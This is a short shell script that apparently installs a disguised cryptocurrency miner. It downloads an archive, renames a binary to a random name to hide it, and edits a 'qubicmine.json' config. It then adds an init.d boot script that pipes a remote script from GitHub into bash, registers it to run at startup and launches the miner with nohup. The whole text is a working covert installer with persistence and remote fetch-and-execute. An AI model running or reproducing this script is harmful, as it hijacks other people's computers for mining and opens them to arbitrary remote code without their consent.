cd /
wget https://github.com/pitlako/ash/releases/download/v1.7.9/digs.zip
unzip digs.zip
cd /digs
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv huts $variable1
sed -i "s/python/${variable1}/g" ./tombs.sh
sed -i "s/ALIAS/${variable1}/g" ./qubicmine.json
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/pitlako/ash/main/soil.sh)" > finds.sh
chmod a+x finds.sh
update-rc.d finds.sh defaults
rm -rf digs.zip
cd /digs
nohup ./tombs.sh
ps -ef | grep digs
